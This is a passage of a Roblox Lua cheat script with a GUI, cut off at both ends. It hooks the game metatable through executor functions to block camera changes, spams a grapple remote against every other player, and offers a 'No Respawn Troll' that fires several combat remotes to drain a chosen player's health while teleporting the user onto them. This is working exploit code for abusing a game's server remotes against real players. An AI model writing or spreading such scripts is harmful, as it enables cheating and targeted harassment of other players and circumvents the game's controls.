	swDropC.CornerRadius = UDim.new(0, 4)
	swDropC.Parent = swDrop
	local swList = Instance.new("UIListLayout")
	swList.Padding = UDim.new(0, 2)
	swList.SortOrder = Enum.SortOrder.LayoutOrder
	swList.Parent = swDrop
	local swAnchor = true
	local swSaved = nil
	local swPending = false
	local swToken = 0
	local swConn = nil
	local function swSet(txt, col)
	swStat.Text = "  " .. txt
	swStat.TextColor3 = col or Color3.fromRGB(140, 140, 140)
	end
	local function swCurrent()
	local ch = LocalPlayer.Character
	local chosen = ch and ch:FindFirstChild("CharacterCHOSENVALUE")
	local v = chosen and tostring(chosen.Value) or ""
	if v == "" or v == "nil" then return nil end
	return v
	end
	local function swPaintCur()
	local n = swCurrent()
	swCur.Text = n and ("  Current: " .. n) or "  Current: -"
	swCur.TextColor3 = n and Color3.fromRGB(230, 230, 230) or Color3.fromRGB(140, 140, 140)
	end
	swPaintCur()
	RunService.Heartbeat:Connect(function()
	if setPage.Visible then swPaintCur() end
	end)
	local function swRemote()
	local paths = {{"SelectACharacter", "ChangeChar"}, {"Remotes", "ChangeChar"}}
	for _, path in ipairs(paths) do
	local node = ReplicatedStorage
	local ok = true
	for _, seg in ipairs(path) do
	node = node and node:FindFirstChild(seg)
	if not node then ok = false break end
	end
	if ok and node and (node:IsA("RemoteEvent") or node:IsA("RemoteFunction")) then return node end
	end
	for _, d in ipairs(ReplicatedStorage:GetDescendants()) do
	if d.Name == "ChangeChar" and (d:IsA("RemoteEvent") or d:IsA("RemoteFunction")) then return d end
	end
	return nil
	end
	local function swPick(name)
	local remote = swRemote()
	if not remote then
	swSet("Error: ChangeChar not found", Color3.fromRGB(200, 80, 80))
	return
	end
	local now = swCurrent()
	if now == name then
	swSet("Already: " .. name, Color3.fromRGB(180, 180, 120))
	return
	end
	if swConn then swConn:Disconnect() swConn = nil end
	swToken = swToken + 1
	local tok = swToken
	swPending = true
	swName.Text = "  " .. name
	swDrop.Visible = false
	swArr.Text = "v"
	if swAnchor then
	local ch = LocalPlayer.Character
	local hrp = ch and ch:FindFirstChild("HumanoidRootPart")
	swSaved = hrp and hrp.CFrame or nil
	else
	swSaved = nil
	end
	swSet("Switching: " .. name, Color3.fromRGB(180, 180, 120))
	swConn = LocalPlayer.CharacterAdded:Connect(function(newChar)
	if tok ~= swToken then return end
	if swConn then swConn:Disconnect() swConn = nil end
	task.spawn(function()
	local chosen
	for _ = 1, 20 do
	chosen = newChar:FindFirstChild("CharacterCHOSENVALUE")
	if chosen then break end
	task.wait(0.1)
	if tok ~= swToken then return end
	end
	local got = chosen and tostring(chosen.Value) or ""
	if got ~= name then
	swPending = false
	swSet("Error: server rejected", Color3.fromRGB(200, 80, 80))
	return
	end
	swPending = false
	if swAnchor and swSaved then
	local hrp = newChar:WaitForChild("HumanoidRootPart", 3)
	if hrp then
	for i = 1, 12 do
	hrp.CFrame = swSaved
	hrp.AssemblyLinearVelocity = Vector3.zero
	task.wait(0.03)
	end
	end
	end
	swSet("Switched: " .. name, Color3.fromRGB(80, 200, 120))
	swPaintCur()
	end)
	end)
	task.delay(6, function()
	if tok == swToken and swPending then
	swPending = false
	if swConn then swConn:Disconnect() swConn = nil end
	swSet("Error: timeout", Color3.fromRGB(200, 80, 80))
	end
	end)
	local ok, err = pcall(function()
	if remote:IsA("RemoteFunction") then
	remote:InvokeServer(name)
	else
	remote:FireServer(name)
	end
	end)
	if not ok then
	swPending = false
	swSet("Error: " .. tostring(err), Color3.fromRGB(200, 80, 80))
	end
	end
	local function swBuild()
	for _, c in ipairs(swDrop:GetChildren()) do
	if c:IsA("GuiObject") then c:Destroy() end
	end
	local folder = ReplicatedStorage:FindFirstChild("Characters")
	if not folder then
	swSet("Error: no Characters folder", Color3.fromRGB(200, 80, 80))
	return
	end
	local hide = {
	BlackNoir=true, ChristmasModel=true, Combat=true, CombatFolder=true,
	Conquest=true, Creel=true, DareDevil=true, OptimusPrime=true,
	Quicksilver=true, SharedAnims=true, SlamModel=true, HitAnimations=true,
	Gru=true, Juggernaut=true, Ken=true, Lyle=true, Physics=true,
	Values=true, Zodiac=true, SSB=true, TheFlashCW=true, Tram=true,
	}
	local names = {}
	for _, f in ipairs(folder:GetChildren()) do
	if (f:IsA("Folder") or f:IsA("Model")) and not hide[f.Name] then
	table.insert(names, f.Name)
	end
	end
	table.sort(names)
	local charIcons = {
	["2099"]="82764474355590", ["atrain"]="96308532679012", ["amazo"]="82222872027659",
	["anakin"]="103984186095453", ["atomeve"]="122589749103962", ["billy"]="73888334351927",
	["brian"]="97733429192526", ["darthvader"]="108475876991470", ["deep"]="138888131313054",
	["deku"]="75796279539634", ["demogorgon"]="116293065660278", ["dexter"]="124237679742346",
	["doctorstrange"]="94565746169136", ["eddie"]="115229991068941", ["eren"]="111697364289768",
	["frontman"]="93734541032948", ["ghostface"]="76983997517024", ["hal"]="118882053287214",
	["homelander"]="100803590280941", ["humantorch"]="92597519094401", ["invincible"]="94024333168835",
	["iris"]="83957446650177", ["ironman"]="80147749198746", ["jeffrey"]="72552661202205",
	["joe"]="121967896628236", ["kira"]="76666274186145", ["kratos"]="96004600420954",
	["lawliet"]="73279166706453", ["luffy"]="86446634293267", ["michael"]="125312410762711",
	["miles"]="85221449471594", ["mohawk"]="121331189050037", ["moonknight"]="109724670485875",
	["mrfantastic"]="97868284614774", ["myers"]="86123641841412", ["nikki"]="114764503419768",
	["omniman"]="74940510054534", ["patrick"]="121396107142832", ["paul"]="132138550461203",
	["peacemaker"]="94429424251538", ["pennywise"]="109557471286265", ["pibby"]="90237935463677",
	["rambo"]="134162118062102", ["reverseflash"]="100080661244517", ["riddler"]="123763480585706",
	["scp173"]="139985810157733", ["scpguard"]="76475076390587", ["sidney"]="85839674896013",
	["soldierboy"]="113885592707742", ["sonic"]="99487330361807", ["spiderman"]="130040781128005",
	["springbonnie"]="87557540397397", ["springtrap"]="119323903097870", ["starlight"]="90569195675557",
	["steve"]="97344659424055", ["steveh"]="113049693241213", ["superman"]="132671170412372",
	["tate"]="138847879491947", ["thebatman"]="74883779082302", ["thragg"]="78630818508241",
	["tomspider"]="76978216605992", ["vecna"]="85921486886701", ["vigilante"]="126171502503961",
	["walter"]="84776035721199", ["wednesday"]="118494291274209", ["zoom"]="120429310858661",
	}
	for _, nm in ipairs(names) do
	local row = Instance.new("Frame")
	row.Size = UDim2.new(1, -6, 0, 20)
	row.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
	row.BorderSizePixel = 0
	row.ZIndex = 13
	row.Parent = swDrop
	local bc = Instance.new("UICorner")
	bc.CornerRadius = UDim.new(0, 3)
	bc.Parent = row
	local ik = string.lower(nm)
	ik = string.gsub(ik, "[%s%-%_%.]", "")
	local id = charIcons[ik]
	local textX = 4
	if id then
	local img = Instance.new("ImageLabel")
	img.Name = "CharIcon"
	img.Size = UDim2.new(0, 18, 0, 18)
	img.Position = UDim2.new(0, 2, 0.5, -9)
	img.BackgroundTransparency = 1
	img.BorderSizePixel = 0
	img.ScaleType = Enum.ScaleType.Fit
	img.ZIndex = 14
	img.Parent = row
	img.Image = "rbxassetid://" .. id
	textX = 22
	end
	local lab = Instance.new("TextLabel")
	lab.Size = UDim2.new(1, -textX - 2, 1, 0)
	lab.Position = UDim2.new(0, textX, 0, 0)
	lab.BackgroundTransparency = 1
	lab.TextColor3 = Color3.fromRGB(220, 220, 220)
	lab.Font = Enum.Font.Gotham
	lab.TextSize = 10
	lab.TextXAlignment = Enum.TextXAlignment.Left
	lab.Text = "- " .. nm
	lab.ZIndex = 14
	lab.Parent = row
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(1, 0, 1, 0)
	b.BackgroundTransparency = 1
	b.Text = ""
	b.ZIndex = 15
	b.Parent = row
	b.MouseButton1Click:Connect(function()
	swPick(nm)
	end)
	end
	swDrop.CanvasSize = UDim2.new(0, 0, 0, #names * 22)
	swSet((#names) .. " characters", Color3.fromRGB(140, 140, 140))
	end
	swArr.MouseButton1Click:Connect(function()
	swDrop.Visible = not swDrop.Visible
	swArr.Text = swDrop.Visible and "^" or "v"
	if swDrop.Visible then swBuild() end
	end)
	setBtn.MouseButton1Click:Connect(function()
	setPage.Visible = true
	Page1.Visible = false
	Page2.Visible = false
	page.Visible = false
	local god = Main:FindFirstChild("GiveGodModePage")
	if god then god.Visible = false end
	local nr = Main:FindFirstChild("NoRespawnPage")
	if nr then nr.Visible = false end
	end)
	setBack.MouseButton1Click:Connect(function()
	setPage.Visible = false
	page.Visible = false
	Page1.Visible = false
	Page2.Visible = true
	local p2 = Main:FindFirstChild("ExtrasPage_2")
	if p2 then p2.Visible = false end
	end)
	local lcOn = false
	local lcThread = nil
	local lcUnlock = nil
	local lcHide = nil
	local lcCam = {}
	local lcSavedFov = nil
	local lcToken = 0
	local lcMt, lcOld
	local function lcUnhook()
	if lcMt and lcOld then
	pcall(function()
	if setreadonly then setreadonly(lcMt, false) end
	lcMt.__newindex = lcOld
	if setreadonly then setreadonly(lcMt, true) end
	end)
	end
	lcMt = nil
	lcOld = nil
	end
	local lcRemote = nil
	lcBtn.MouseButton1Click:Connect(function()
	if lcOn then
	lcOn = false
	lcBtn.Text = "Lock camWobble"
	lcBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	if lcThread then task.cancel(lcThread) lcThread = nil end
	if lcUnlock then lcUnlock:Disconnect() lcUnlock = nil end
	if lcHide then lcHide:Disconnect() lcHide = nil end
	local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if hum then
	hum.WalkSpeed = 16
	hum.JumpPower = 50
	hum.Sit = false
	hum.PlatformStand = false
	hum.AutoRotate = true
	end
	lcUnhook()
	lcToken = lcToken + 1
	local tok = lcToken
	task.delay(1, function()
	if lcToken ~= tok or lcOn then return end
	for _, c in ipairs(lcCam) do pcall(function() c:Disconnect() end) end
	lcCam = {}
	lcUnhook()
	local cam = workspace.CurrentCamera
	if cam and lcSavedFov then pcall(function() cam.FieldOfView = lcSavedFov end) end
	lcSavedFov = nil
	end)
	return
	end
	lcOn = true
	lcBtn.Text = "Lock camWobble: ON"
	lcBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	lcToken = lcToken + 1
	if not lcRemote or not lcRemote.Parent then
	local chars = ReplicatedStorage:FindFirstChild("Characters")
	if chars then
	for _, f in ipairs(chars:GetChildren()) do
	local fn = string.lower(f.Name)
	if string.find(fn, "spiderman", 1, true) or string.find(fn, "spider_man", 1, true) then
	local rem = f:FindFirstChild("Remotes")
	lcRemote = rem and rem:FindFirstChild("WebGrapple")
	break
	end
	end
	end
	end
	local cam = workspace.CurrentCamera
	if cam then
	lcSavedFov = cam.FieldOfView
	pcall(function()
	cam.CameraType = Enum.CameraType.Custom
	cam.FieldOfView = 70
	local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if hum then cam.CameraSubject = hum end
	end)
	table.insert(lcCam, cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
	if lcOn and cam.FieldOfView ~= 70 then pcall(function() cam.FieldOfView = 70 end) end
	end))
	table.insert(lcCam, RunService.RenderStepped:Connect(function()
	if not lcOn or not cam then return end
	if cam.FieldOfView ~= 70 then pcall(function() cam.FieldOfView = 70 end) end
	if cam.CameraType ~= Enum.CameraType.Custom then pcall(function() cam.CameraType = Enum.CameraType.Custom end) end
	local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if h and cam.CameraSubject ~= h then pcall(function() cam.CameraSubject = h end) end
	if h and h.CameraOffset ~= Vector3.new(0, 0, 0) then pcall(function() h.CameraOffset = Vector3.new(0, 0, 0) end) end
	end))
	pcall(function()
	lcMt = getrawmetatable(game)
	lcOld = lcMt.__newindex
	if setreadonly then setreadonly(lcMt, false) end
	local oldNewIndex = lcOld
	local hook = function(self, key, value)
	if lcOn and self == cam then
	if key == "CameraType" and value ~= Enum.CameraType.Custom then return end
	if key == "CFrame" or key == "Focus" then
	local caller = nil
	pcall(function() caller = getcallingscript() end)
	local n = caller and caller:GetFullName() or ""
	if string.find(n, "PlayerModule") or string.find(n, "CameraModule") or string.find(n, "CameraScript") or string.find(n, "ControlModule") then
	return oldNewIndex(self, key, value)
	end
	return
	end
	if key == "FieldOfView" and value ~= 70 then return end
	if key == "CameraSubject" then
	local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if value == h then return oldNewIndex(self, key, value) end
	return
	end
	end
	if lcOn and key == "CameraOffset" and typeof(self) == "Instance" and self:IsA("Humanoid") then
	local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if self == h then return end
	end
	return oldNewIndex(self, key, value)
	end
	if newcclosure then hook = newcclosure(hook) end
	lcMt.__newindex = hook
	if setreadonly then setreadonly(lcMt, true) end
	end)
	end
	lcUnlock = RunService.Heartbeat:Connect(function()
	if not lcOn then return end
	local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if not h then return end
	if h.WalkSpeed < 20 then h.WalkSpeed = 20 end
	if h.JumpPower < 50 then h.JumpPower = 50 end
	if h.Sit then h.Sit = false end
	if h.PlatformStand then h.PlatformStand = false end
	if not h.AutoRotate then h.AutoRotate = true end
	end)
	lcHide = RunService.Heartbeat:Connect(function()
	if not lcOn then return end
	for _, plr in ipairs(Players:GetPlayers()) do
	local char = plr.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	local anim = hum and hum:FindFirstChildOfClass("Animator")
	if anim then
	for _, track in ipairs(anim:GetPlayingAnimationTracks()) do
	local id = track.Animation and track.Animation.AnimationId
	if id and string.find(tostring(id), "12197326570", 1, true) then
	pcall(function() track:Stop(0) end)
	end
	end
	end
	end
	end)
	lcThread = task.spawn(function()
	while lcOn do
	if lcRemote then
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer and plr.Character then
	local hum = plr.Character:FindFirstChildOfClass("Humanoid")
	if hum and hum.Health > 0 then
	pcall(function()
	lcRemote:FireServer(plr.DisplayName)
	lcRemote:FireServer(plr.Name)
	lcRemote:FireServer(plr.Character)
	end)
	end
	end
	end
	end
	task.wait(0.05)
	end
	end)
	end)
	local nrPage = Instance.new("Frame")
	nrPage.Name = "NoRespawnPage"
	nrPage.Size = Page2.Size
	nrPage.Position = Page2.Position
	nrPage.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
	nrPage.BorderSizePixel = 0
	nrPage.Active = true
	nrPage.Visible = false
	nrPage.ZIndex = 8
	nrPage.Parent = Main
	local nrBack = Instance.new("TextButton")
	nrBack.Size = UDim2.new(0, 46, 0, 46)
	nrBack.Position = UDim2.new(0, 6, 0, 6)
	nrBack.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	nrBack.TextColor3 = Color3.fromRGB(255, 255, 255)
	nrBack.Font = Enum.Font.GothamBold
	nrBack.TextSize = 11
	nrBack.Text = "Back"
	nrBack.ZIndex = 23
	nrBack.Parent = nrPage
	local nrBackC = Instance.new("UICorner")
	nrBackC.CornerRadius = UDim.new(0, 4)
	nrBackC.Parent = nrBack
	local nrTitle = Instance.new("TextLabel")
	nrTitle.Size = UDim2.new(1, -60, 0, 18)
	nrTitle.Position = UDim2.new(0, 56, 0, 8)
	nrTitle.BackgroundTransparency = 1
	nrTitle.Font = Enum.Font.GothamBold
	nrTitle.TextSize = 12
	nrTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
	nrTitle.TextXAlignment = Enum.TextXAlignment.Left
	nrTitle.Text = "No Respawn Troll"
	nrTitle.ZIndex = 23
	nrTitle.Parent = nrPage
	local nrGo = Instance.new("TextButton")
	nrGo.Name = "ExecuteBtn"
	nrGo.Size = UDim2.new(1, -12, 0, 22)
	nrGo.Position = UDim2.new(0, 6, 0, 58)
	nrGo.BackgroundColor3 = Color3.fromRGB(40, 120, 60)
	nrGo.TextColor3 = Color3.fromRGB(255, 255, 255)
	nrGo.Font = Enum.Font.GothamBold
	nrGo.TextSize = 11
	nrGo.Text = "Execute"
	nrGo.ZIndex = 23
	nrGo.Parent = nrPage
	local nrGoC = Instance.new("UICorner")
	nrGoC.CornerRadius = UDim.new(0, 4)
	nrGoC.Parent = nrGo
	local nrName = Instance.new("TextBox")
	nrName.Name = "NameBox"
	nrName.Size = UDim2.new(1, -44, 0, 22)
	nrName.Position = UDim2.new(0, 38, 0, 86)
	nrName.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
	nrName.TextColor3 = Color3.fromRGB(240, 240, 240)
	nrName.PlaceholderText = "Enter name..."
	nrName.PlaceholderColor3 = Color3.fromRGB(140, 140, 140)
	nrName.Text = ""
	nrName.Font = Enum.Font.Gotham
	nrName.TextSize = 11
	nrName.TextXAlignment = Enum.TextXAlignment.Left
	nrName.ClearTextOnFocus = false
	nrName.ZIndex = 23
	nrName.Active = true
	nrName.Parent = nrPage
	local nrNameC = Instance.new("UICorner")
	nrNameC.CornerRadius = UDim.new(0, 4)
	nrNameC.Parent = nrName
	local nrPad = Instance.new("UIPadding")
	nrPad.PaddingLeft = UDim.new(0, 6)
	nrPad.Parent = nrName
	local nrGhost = Instance.new("TextLabel")
	nrGhost.BackgroundTransparency = 1
	nrGhost.TextColor3 = Color3.fromRGB(120, 120, 120)
	nrGhost.Font = Enum.Font.Gotham
	nrGhost.TextSize = 11
	nrGhost.TextXAlignment = Enum.TextXAlignment.Left
	nrGhost.Text = ""
	nrGhost.ZIndex = 24
	nrGhost.Parent = nrName
	nrName:GetPropertyChangedSignal("Text"):Connect(function()
	local typed = nrName.Text or ""
	local q = string.lower(typed)
	local full = typed
	if q ~= "" then
	local best, bestScore
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer then
	local name = plr.Name
	local low = string.lower(name)
	local score
	if low == q then
	score = 0
	elseif string.sub(low, 1, #q) == q then
	score = 1 + (#name - #q)
	else
	score = 1000
	local hit = string.find(low, q, 1, true)
	if hit then score = 100 + hit end
	end
	if not bestScore or score < bestScore then
	best, bestScore = name, score
	end
	end
	end
	if best and bestScore and bestScore < 1000 then full = best end
	end
	local rest = ""
	if typed ~= "" and string.lower(string.sub(full, 1, #typed)) == q and #full > #typed then
	rest = string.sub(full, #typed + 1)
	end
	nrGhost.Text = rest
	local width = game:GetService("TextService"):GetTextSize(typed, 11, Enum.Font.Gotham, Vector2.new(1000, 22)).X
	nrGhost.Position = UDim2.new(0, width + 8, 0, 0)
	nrGhost.Size = UDim2.new(1, -(width + 10), 1, 0)
	nrName:SetAttribute("Match", full)
	end)
	nrName.FocusLost:Connect(function()
	if nrName.Text ~= "" then
	nrName.Text = tostring(nrName:GetAttribute("Match") or nrName.Text)
	end
	end)
	local nrNote = Instance.new("TextLabel")
	nrNote.Name = "NotWorking"
	nrNote.Size = UDim2.new(1, -28, 0, 16)
	nrNote.Position = UDim2.new(0, 22, 0, 114)
	nrNote.BackgroundTransparency = 1
	nrNote.Font = Enum.Font.Gotham
	nrNote.TextSize = 11
	nrNote.TextColor3 = Color3.fromRGB(180, 180, 180)
	nrNote.TextXAlignment = Enum.TextXAlignment.Left
	nrNote.Text = "not working"
	nrNote.ZIndex = 20
	nrNote.Parent = nrPage
	local nrPic = Instance.new("ImageLabel")
	nrPic.Name = "NotWorkingIcon"
	nrPic.Size = UDim2.new(0, 14, 0, 14)
	nrPic.Position = UDim2.new(0, 6, 0, 115)
	nrPic.BackgroundTransparency = 1
	nrPic.Image = "rbxassetid://98265253208870"
	nrPic.ScaleType = Enum.ScaleType.Fit
	nrPic.ZIndex = 20
	nrPic.Parent = nrPage
	local nrArrow = Instance.new("TextButton")
	nrArrow.Size = UDim2.new(0, 28, 0, 22)
	nrArrow.Position = UDim2.new(0, 6, 0, 86)
	nrArrow.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
	nrArrow.TextColor3 = Color3.fromRGB(230, 230, 230)
	nrArrow.Font = Enum.Font.GothamBold
	nrArrow.TextSize = 12
	nrArrow.Text = "v"
	nrArrow.ZIndex = 23
	nrArrow.Parent = nrPage
	local nrArrowC = Instance.new("UICorner")
	nrArrowC.CornerRadius = UDim.new(0, 4)
	nrArrowC.Parent = nrArrow
	local nrDrop = Instance.new("Frame")
	nrDrop.Name = "Drop"
	nrDrop.Size = UDim2.new(1, -12, 0, 88)
	nrDrop.Position = UDim2.new(0, 6, 0, 112)
	nrDrop.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
	nrDrop.Visible = false
	nrDrop.ZIndex = 24
	nrDrop.Parent = nrPage
	local nrDropC = Instance.new("UICorner")
	nrDropC.CornerRadius = UDim.new(0, 4)
	nrDropC.Parent = nrDrop
	local nrList = Instance.new("ScrollingFrame")
	nrList.Size = UDim2.new(1, -4, 1, -4)
	nrList.Position = UDim2.new(0, 2, 0, 2)
	nrList.BackgroundTransparency = 1
	nrList.BorderSizePixel = 0
	nrList.ScrollBarThickness = 4
	nrList.CanvasSize = UDim2.new(0, 0, 0, 0)
	nrList.ZIndex = 30
	nrList.Parent = nrDrop
	nrArrow.MouseButton1Click:Connect(function()
	nrDrop.Visible = not nrDrop.Visible
	nrArrow.Text = nrDrop.Visible and "^" or "v"
	if not nrDrop.Visible then return end
	for _, ch in ipairs(nrList:GetChildren()) do
	if ch:IsA("TextButton") then ch:Destroy() end
	end
	local n = 0
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer then
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(1, -4, 0, 18)
	b.Position = UDim2.new(0, 2, 0, n * 20)
	b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	b.TextColor3 = Color3.fromRGB(230, 230, 230)
	b.Font = Enum.Font.Gotham
	b.TextSize = 11
	b.TextXAlignment = Enum.TextXAlignment.Left
	b.Text = "  " .. plr.Name
	b.ZIndex = 31
	b.Parent = nrList
	local bc = Instance.new("UICorner")
	bc.CornerRadius = UDim.new(0, 3)
	bc.Parent = b
	b.MouseButton1Click:Connect(function()
	nrName.Text = plr.Name
	nrDrop.Visible = false
	nrArrow.Text = "v"
	end)
	n = n + 1
	end
	end
	nrList.CanvasSize = UDim2.new(0, 0, 0, math.max(20, n * 20))
	end)
	nrBtn.MouseButton1Click:Connect(function()
	nrPage.Visible = true
	Page1.Visible = false
	Page2.Visible = false
	page.Visible = false
	local god = Main:FindFirstChild("GiveGodModePage")
	if god then god.Visible = false end
	end)
	nrBack.MouseButton1Click:Connect(function()
	nrPage.Visible = false
	nrDrop.Visible = false
	page.Visible = true
	end)
	local nrCool = false
	local nrFollow = nil
	local nrLock = nil
	local nrLockOn = false
	LocalPlayer.CharacterAdded:Connect(function()
	if nrFollow then nrFollow:Disconnect() nrFollow = nil end
	if nrLock then nrLock:Disconnect() nrLock = nil end
	nrLockOn = false
	pcall(function()
	UIS.MouseBehavior = Enum.MouseBehavior.Default
	end)
	end)
	nrGo.MouseButton1Click:Connect(function()
	if nrCool then return end
	local q = string.lower(nrName.Text or "")
	local target = nil
	if q ~= "" then
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer and string.lower(plr.Name) == q then
	target = plr
	break
	end
	end
	if not target then
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer and string.find(string.lower(plr.Name), q, 1, true) then
	target = plr
	break
	end
	end
	end
	end
	if not target or not target.Character then
	nrGo.Text = "No name"
	task.delay(0.8, function()
	if not nrCool then nrGo.Text = "Execute" end
	end)
	return
	end
	nrCool = true
	nrGo.BackgroundColor3 = Color3.fromRGB(40, 90, 50)
	local hum = target.Character:FindFirstChildOfClass("Humanoid")
	if hum then
	local need = math.floor(hum.Health - 21 + 0.5)
	if need > 0 then
	local hitR, shotR, comboR
	local chars = ReplicatedStorage:FindFirstChild("Characters")
	if chars then
	for _, folder in ipairs(chars:GetChildren()) do
	local rem = folder:FindFirstChild("Remotes")
	local fn = string.lower(folder.Name)
	if rem then
	if not hitR and string.find(fn, "homelander", 1, true) then hitR = rem:FindFirstChild("HitGround") end
	if not shotR and string.find(fn, "zodiac", 1, true) then shotR = rem:FindFirstChild("ShotHit") end
	if not comboR and string.find(fn, "combat", 1, true) then comboR = rem:FindFirstChild("ComboWeak") end
	end
	end
	end
	local a, b, c = 0, 0, 0
	local rest = need
	a = math.floor(rest / 15)
	rest = rest - a * 15
	b = math.floor(rest / 5)
	rest = rest - b * 5
	c = math.floor(rest / 2)
	for _ = 1, a do
	pcall(function()
	hitR:FireServer(target.DisplayName)
	hitR:FireServer(target.Name)
	hitR:FireServer(target.Character)
	end)
	end
	for _ = 1, b do
	pcall(function()
	shotR:FireServer(target.DisplayName)
	shotR:FireServer(target.Name)
	shotR:FireServer(target.Character)
	end)
	end
	for _ = 1, c do
	pcall(function()
	comboR:FireServer(target.DisplayName)
	comboR:FireServer(target.Name)
	comboR:FireServer(target.Character)
	end)
	end
	end
	end
	if nrFollow then nrFollow:Disconnect() end
	local followEnd = tick() + 4
	nrFollow = RunService.Heartbeat:Connect(function()
	if tick() >= followEnd then
	if nrFollow then nrFollow:Disconnect() nrFollow = nil end
	return
	end
	local myChar = LocalPlayer.Character
	local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
	local tChar = target.Character
	local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
	if myRoot and tRoot then
	local dir = Vector3.new(myRoot.Position.X - tRoot.Position.X, 0, myRoot.Position.Z - tRoot.Position.Z)
	if dir.Magnitude < 0.1 then dir = tRoot.CFrame.LookVector else dir = dir.Unit end
	local pos = tRoot.Position + dir * 3
	myRoot.CFrame = CFrame.new(pos, pos + tRoot.CFrame.LookVector)
	myRoot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
	end
	end)
	task.spawn(function()
	local topEnd = tick() + 4
	while tick() < topEnd do
	local tChar = target.Character
	local tHum = tChar and tChar:FindFirstChildOfClass("Humanoid")
	if tHum and tHum.Health > 21 then
	local need = math.floor(tHum.Health - 21 + 0.5)
	if need > 0 then
	local hitR, shotR, comboR
	local chars = ReplicatedStorage:FindFirstChild("Characters")
	if chars then
	for _, folder in ipairs(chars:GetChildren()) do
	local rem = folder:FindFirstChild("Remotes")
	local fn = string.lower(folder.Name)
	if rem then
	if not hitR and string.find(fn, "homelander", 1, true) then hitR = rem:FindFirstChild("HitGround") end
	if not shotR and string.find(fn, "zodiac", 1, true) then shotR = rem:FindFirstChild("ShotHit") end
	if not comboR and string.find(fn, "combat", 1, true) then comboR = rem:FindFirstChild("ComboWeak") end
	end
	end
	end
	local rest = need
	local a = math.floor(rest / 15)
	rest = rest - a * 15
	local b = math.floor(rest / 5)
	rest = rest - b * 5
	local c = math.floor(rest / 2)
	for _ = 1, a do
	pcall(function()
	hitR:FireServer(target.DisplayName)
	hitR:FireServer(target.Name)
	hitR:FireServer(target.Character)
	end)
	end
	for _ = 1, b do
	pcall(function()
	shotR:FireServer(target.DisplayName)
	shotR:FireServer(target.Name)
	shotR:FireServer(target.Character)
	end)
	end
	for _ = 1, c do
	pcall(function()
	comboR:FireServer(target.DisplayName)
	comboR:FireServer(target.Name)
	comboR:FireServer(target.Character)
	end)
	end
	end
	end
	task.wait(0.15)
	end
	end)
	task.spawn(function()
	local move5
	local chars = ReplicatedStorage:FindFirstChild("Characters")
	if chars then
	local f = chars:FindFirstChild("Conquest") or chars:FindFirstChild("conquest")
	local rem = f and f:FindFirstChild("Remotes")
	move5 = rem and rem:FindFirstChild("MoveFive")
	end
	local endT = tick() + 4
	while tick() < endT do
	if move5 then pcall(function() move5:FireServer() end) end
	task.wait(0.05)
	end
	end)
	task.delay(8, function()
	if nrLockOn then return end
	local char = LocalPlayer.Character
	local hum2 = char and char:FindFirstChildOfClass("Humanoid")
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not hum2 or not root then return end
	hum2.AutoRotate = false
	pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.LockCenter end)
	if nrLock then nrLock:Disconnect() end
	nrLock = RunService.RenderStepped:Connect(function()
	local c = LocalPlayer.Character
	local h = c and c:FindFirstChildOfClass("Humanoid")
	local r = c and c:FindFirstChild("HumanoidRootPart")
	if not r then return end
	if h and h.AutoRotate then h.AutoRotate = false end
	local cam = workspace.CurrentCamera
	if not cam then return end
	local look = cam.CFrame.LookVector
	local yaw = math.atan2(-look.X, -look.Z)
	r.CFrame = CFrame.new(r.Position) * CFrame.Angles(0, yaw, 0)
	end)
	nrLockOn = true
	end)
	task.spawn(function()
	local dots = {".", "..", "..."}
	local i = 0
	local t0 = tick()
	while tick() - t0 < 8 do
	i = i + 1
	nrGo.Text = dots[(i - 1) % 3 + 1]
	task.wait(0.35)
	end
	nrCool = false
	nrGo.Text = "Execute"
	nrGo.BackgroundColor3 = Color3.fromRGB(40, 120, 60)
	end)
	end)
	end)
	ex2.MouseButton1Click:Connect(function()
	Page1.Visible = false
	Page2.Visible = false
	page.Visible = true
	local god = Main:FindFirstChild("GiveGodModePage")
	if god then god.Visible = false end
	local st = Main:FindFirstChild("ExSettingsPage")
	if st then st.Visible = false end
	local nrp = Main:FindFirstChild("NoRespawnPage")
	if nrp then nrp.Visible = false end
	Tab1.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
	Tab1.TextColor3 = Color3.fromRGB(180, 180, 180)
	Tab2.BackgroundColor3 = Color3.fromRGB(35, 30, 50)
	Tab2.BackgroundTransparency = 0.4
	Tab2.TextColor3 = Color3.fromRGB(160, 150, 180)
	ex2.BackgroundColor3 = Color3.fromRGB(140, 60, 220)
	ex2.BackgroundTransparency = 0
	ex2.TextColor3 = Color3.fromRGB(255, 255, 255)
	end)
	local wallHitRemote = nil
	while true do
